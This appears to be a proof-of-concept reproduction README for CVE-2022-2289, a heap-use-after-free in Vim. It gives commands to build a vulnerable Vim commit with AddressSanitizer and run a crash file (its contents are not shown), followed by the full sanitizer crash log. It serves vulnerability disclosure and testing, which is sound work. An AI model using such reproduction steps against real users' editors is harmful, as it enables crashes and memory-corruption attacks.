### CVE-2022-2289

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/7447d2ea-db5b-4883-adf4-1eaf7deace64/)

### Docker Container Run Command
```shell
docker build -t cve-2022-2289-poc .
docker run -itd --name CVE-2022-2289-POC cve-2022-2289-poc
docker exec -it CVE-2022-2289-POC /bin/bash
```

### PoC Reproduce Command
```shell
# 准备初始环境
apt-get update -y
apt-get install git -y

# 配置Github的本地SSH，拉取vim仓库 (ssh-keygen)
git clone git@github.com:vim/vim.git

# 回滚到指定存在漏洞的版本
cd vim/
git reset --hard 75417d960bd17a5b701cfb625b8864dacaf0cc39

# 安装vim的编译安装工具依赖
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# 进入src文件夹
cd ./src

# 配置，编译，安装vim
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# 打开poc文件
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_huaf3_s.dat -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_huaf3_s.dat -c :qa!
```

### Description
观察到：
```shell
debug=  define=^\s*#\s*define  dictionary=  diffexpr=  diffopt=internal,filler,closeoff  directory=.,~/tmp,/var/tmp,/tmp  display=
=================================================================
==9608==ERROR: AddressSanitizer: heap-use-after-free on address 0xffff90d06b88 at pc 0xaaaaceb9155c bp 0xffffea18f190 sp 0xffffea18f1a0
READ of size 8 at 0xffff90d06b88 thread T0
#0 0xaaaaceb91558  (/usr/local/bin/vim+0x206558)
#1 0xaaaaceb905f0  (/usr/local/bin/vim+0x2055f0)
#2 0xaaaaceeb50d4  (/usr/local/bin/vim+0x52a0d4)
#3 0xaaaaceeb4f1c  (/usr/local/bin/vim+0x529f1c)
#4 0xaaaacee8377c  (/usr/local/bin/vim+0x4f877c)
#5 0xaaaacecc4b24  (/usr/local/bin/vim+0x339b24)
#6 0xaaaacecc4880  (/usr/local/bin/vim+0x339880)
#7 0xaaaacecc3f50  (/usr/local/bin/vim+0x338f50)
#8 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#9 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#10 0xaaaacf04cacc  (/usr/local/bin/vim+0x6c1acc)
#11 0xaaaacf04dd08  (/usr/local/bin/vim+0x6c2d08)
#12 0xaaaacf04a380  (/usr/local/bin/vim+0x6bf380)
#13 0xaaaacf04a3dc  (/usr/local/bin/vim+0x6bf3dc)
#14 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#15 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#16 0xaaaacec8e1e8  (/usr/local/bin/vim+0x3031e8)
#17 0xaaaacf38344c  (/usr/local/bin/vim+0x9f844c)
#18 0xaaaacf37b30c  (/usr/local/bin/vim+0x9f030c)
#19 0xaaaacf37a9f0  (/usr/local/bin/vim+0x9ef9f0)
#20 0xffff989573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#21 0xffff989574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#22 0xaaaaceadd1ec  (/usr/local/bin/vim+0x1521ec)

0xffff90d06b88 is located 8 bytes inside of 136-byte region [0xffff90d06b80,0xffff90d06c08)
freed by thread T0 here:
#0 0xffff98c79fe8 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127
#1 0xaaaaceaddad4  (/usr/local/bin/vim+0x152ad4)
#2 0xaaaaceb83af0  (/usr/local/bin/vim+0x1f8af0)
#3 0xaaaaceb825c8  (/usr/local/bin/vim+0x1f75c8)
#4 0xaaaacedeb614  (/usr/local/bin/vim+0x460614)
#5 0xaaaacede9460  (/usr/local/bin/vim+0x45e460)
#6 0xaaaaceb92110  (/usr/local/bin/vim+0x207110)
#7 0xaaaaceb905f0  (/usr/local/bin/vim+0x2055f0)
#8 0xaaaaceeb50d4  (/usr/local/bin/vim+0x52a0d4)
#9 0xaaaaceeb4f1c  (/usr/local/bin/vim+0x529f1c)
#10 0xaaaacee8377c  (/usr/local/bin/vim+0x4f877c)
#11 0xaaaacecc4b24  (/usr/local/bin/vim+0x339b24)
#12 0xaaaacecc4880  (/usr/local/bin/vim+0x339880)
#13 0xaaaacecc3f50  (/usr/local/bin/vim+0x338f50)
#14 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#15 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#16 0xaaaacf04cacc  (/usr/local/bin/vim+0x6c1acc)
#17 0xaaaacf04dd08  (/usr/local/bin/vim+0x6c2d08)
#18 0xaaaacf04a380  (/usr/local/bin/vim+0x6bf380)
#19 0xaaaacf04a3dc  (/usr/local/bin/vim+0x6bf3dc)
#20 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#21 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#22 0xaaaacec8e1e8  (/usr/local/bin/vim+0x3031e8)
#23 0xaaaacf38344c  (/usr/local/bin/vim+0x9f844c)
#24 0xaaaacf37b30c  (/usr/local/bin/vim+0x9f030c)
#25 0xaaaacf37a9f0  (/usr/local/bin/vim+0x9ef9f0)
#26 0xffff989573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#27 0xffff989574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#28 0xaaaaceadd1ec  (/usr/local/bin/vim+0x1521ec)

previously allocated by thread T0 here:
#0 0xffff98c7a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaaceadd744  (/usr/local/bin/vim+0x152744)
#2 0xaaaaceadd4cc  (/usr/local/bin/vim+0x1524cc)
#3 0xaaaaceb83cd8  (/usr/local/bin/vim+0x1f8cd8)
#4 0xaaaaceb8ad74  (/usr/local/bin/vim+0x1ffd74)
#5 0xaaaaceb85afc  (/usr/local/bin/vim+0x1faafc)
#6 0xaaaaceb8620c  (/usr/local/bin/vim+0x1fb20c)
#7 0xaaaaceb93854  (/usr/local/bin/vim+0x208854)
#8 0xaaaaceb2437c  (/usr/local/bin/vim+0x19937c)
#9 0xaaaaceb26944  (/usr/local/bin/vim+0x19b944)
#10 0xaaaaceb25c84  (/usr/local/bin/vim+0x19ac84)
#11 0xaaaacebd94f4  (/usr/local/bin/vim+0x24e4f4)
#12 0xaaaacebd7d2c  (/usr/local/bin/vim+0x24cd2c)
#13 0xaaaacebd3b60  (/usr/local/bin/vim+0x248b60)
#14 0xaaaaceeb388c  (/usr/local/bin/vim+0x52888c)
#15 0xaaaaceeaccf4  (/usr/local/bin/vim+0x521cf4)
#16 0xaaaaceeb6590  (/usr/local/bin/vim+0x52b590)
#17 0xaaaacee8377c  (/usr/local/bin/vim+0x4f877c)
#18 0xaaaacecc4b24  (/usr/local/bin/vim+0x339b24)
#19 0xaaaacecc4880  (/usr/local/bin/vim+0x339880)
#20 0xaaaacecc3f50  (/usr/local/bin/vim+0x338f50)
#21 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#22 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#23 0xaaaacf04cacc  (/usr/local/bin/vim+0x6c1acc)
#24 0xaaaacf04dd08  (/usr/local/bin/vim+0x6c2d08)
#25 0xaaaacf04a380  (/usr/local/bin/vim+0x6bf380)
#26 0xaaaacf04a3dc  (/usr/local/bin/vim+0x6bf3dc)
#27 0xaaaacec9affc  (/usr/local/bin/vim+0x30fffc)
#28 0xaaaacec902b0  (/usr/local/bin/vim+0x3052b0)
#29 0xaaaacec8e1e8  (/usr/local/bin/vim+0x3031e8)

SUMMARY: AddressSanitizer: heap-use-after-free (/usr/local/bin/vim+0x206558)
Shadow bytes around the buggy address:
0x200ff21a0d20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff21a0d30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff21a0d40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff21a0d50: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd
0x200ff21a0d60: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa
=>0x200ff21a0d70: fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x200ff21a0d80: fd fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00
0x200ff21a0d90: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
0x200ff21a0da0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
0x200ff21a0db0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd
0x200ff21a0dc0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9608==ABORTING
```



